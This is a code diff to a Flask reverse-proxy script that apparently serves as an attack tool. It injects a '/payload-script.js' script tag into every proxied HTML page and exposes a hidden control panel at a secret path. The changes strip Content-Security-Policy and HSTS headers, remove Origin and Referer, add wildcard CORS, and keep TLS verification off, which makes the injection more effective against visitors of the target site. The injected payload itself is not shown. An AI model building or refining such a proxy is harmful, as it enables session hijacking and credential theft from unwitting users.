@@ -88,28 +88,41 @@ def start_proxy(target, host, port, secret):
     def serve_payload():
         return send_from_directory('.', 'payload-script.js')
 
-    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
-    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
+    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
+    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     def proxy(path):
-        # Check if it's a panel request
+        # Debug logging
+        print(f"[*] Incoming request: {request.method} {path}")
+        print(f"[*] Headers: {dict(request.headers)}")
+        
         if path.startswith(secret):
             return panel_index()
 
-        # Build target URL
         target_url = f"https://{target}/{path}"
+        print(f"[*] Proxying to: {target_url}")
         
-        # Forward headers but exclude some
+        # Handle OPTIONS requests for CORS
+        if request.method == 'OPTIONS':
+            return Response('', 200, {
+                'Access-Control-Allow-Origin': '*',
+                'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
+                'Access-Control-Allow-Headers': 'Content-Type, Authorization',
+                'Access-Control-Max-Age': '3600'
+            })
+
+        # Forward headers but exclude problematic ones
         headers = {
             key: value for key, value in request.headers if key.lower() not in [
                 'host', 
                 'content-length',
-                'connection'
+                'connection',
+                'origin',
+                'referer'
             ]
         }
         headers['Host'] = target
-
+        
         try:
-            # Make the request to the target
             resp = requests.request(
                 method=request.method,
                 url=target_url,
@@ -120,39 +133,47 @@ def start_proxy(target, host, port, secret):
                 allow_redirects=False,
                 verify=False
             )
-
+            
             # Process response
             excluded_headers = [
                 'content-encoding', 
                 'content-length', 
                 'transfer-encoding', 
-                'connection'
+                'connection',
+                'strict-transport-security',
+                'content-security-policy'
             ]
-            headers = [
+            
+            response_headers = [
                 (name, value) 
                 for (name, value) in resp.raw.headers.items() 
                 if name.lower() not in excluded_headers
             ]
+            
+            # Add CORS headers
+            response_headers.extend([
+                ('Access-Control-Allow-Origin', '*'),
+                ('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS'),
+                ('Access-Control-Allow-Headers', 'Content-Type, Authorization')
+            ])
 
-            # Inject payload if HTML
             response = resp.content
             if 'text/html' in resp.headers.get('Content-Type', ''):
                 try:
                     decoded = response.decode('utf-8')
+                    payload = '<script src="/payload-script.js"></script>'
                     if '</head>' in decoded:
-                        payload = '<script src="/payload-script.js"></script>'
                         decoded = decoded.replace('</head>', f'{payload}</head>')
                     elif '<body>' in decoded:
-                        payload = '<script src="/payload-script.js"></script>'
                         decoded = decoded.replace('<body>', f'<body>{payload}')
                     response = decoded.encode('utf-8')
                 except UnicodeDecodeError:
                     pass
 
-            return Response(response, resp.status_code, headers)
+            return Response(response, resp.status_code, response_headers)
 
         except Exception as e:
-            print(f"Proxy Error: {str(e)}")
+            print(f"[!] Proxy Error: {str(e)}")
             return f"Error: {str(e)}", 500
 
     # Enable cross-origin requests
